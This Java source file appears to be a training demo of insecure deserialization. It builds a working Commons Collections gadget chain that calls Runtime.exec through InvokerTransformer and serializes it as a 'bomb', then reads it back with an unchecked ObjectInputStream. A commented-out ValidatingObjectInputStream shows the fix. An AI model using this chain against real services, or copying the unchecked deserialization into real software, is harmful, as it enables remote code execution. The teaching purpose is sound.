package victor.training.spring.vulnerability;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.io.serialization.ValidatingObjectInputStream;

import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

public class InsecureDeserialization {

  public static final File FILE = new File("serialized-bomb.dat");

  public static class Read {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
      File pwnedFile = new File("pwned");
      pwnedFile.delete();
      System.out.println("Any 'pwned' exists: " + pwnedFile.delete());

      //      Runtime.getRuntime().exec("touch pwned"); // effect of loading .class

//      try (ValidatingObjectInputStream objectOutputStream = new ValidatingObjectInputStream(new FileInputStream(FILE))) {
//        objectOutputStream.accept(ExpectedClass.class); // ✅

      try (ObjectInputStream objectOutputStream = new ObjectInputStream(new FileInputStream(FILE))) { // ❌
        Object o = objectOutputStream.readObject();
        System.out.println("Got : " + o);
        ExpectedClass e = (ExpectedClass) o;
      }
    }
  }

  public static class Generate {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
      // 1. Benign transformer used during construction
      Transformer safeTransformer = new ConstantTransformer(1); // always returns comparable int 1

      // 2. Comparator using the safe transformer
      TransformingComparator comparator = new TransformingComparator(safeTransformer);

      // 3. PriorityQueue built with safe comparator
      PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
      queue.add(1);
      queue.add(1);

      // 4. Evil transformer swapped in afterwards
      Transformer transformerChain = new ChainedTransformer(
          new ConstantTransformer(Runtime.class),
          new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
          new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
          new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"touch pwned"}),
          new ConstantTransformer(1) // returns Integer (Comparable)
      );

      // 5. Swap safe transformer with malicious one via reflection
      Field f = TransformingComparator.class.getDeclaredField("transformer");
      f.setAccessible(true);
      f.set(comparator, transformerChain);

      // 6. queue
      try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(FILE))) {
        oos.writeObject(queue);
      }
      System.out.println("Generated bomb at " + FILE.getAbsolutePath());
    }
  }

  public static class ExpectedClass {
    private int data;

    public int getData() {
      return data;
    }

    public void setData(int data) {
      this.data = data;
    }
  }
}

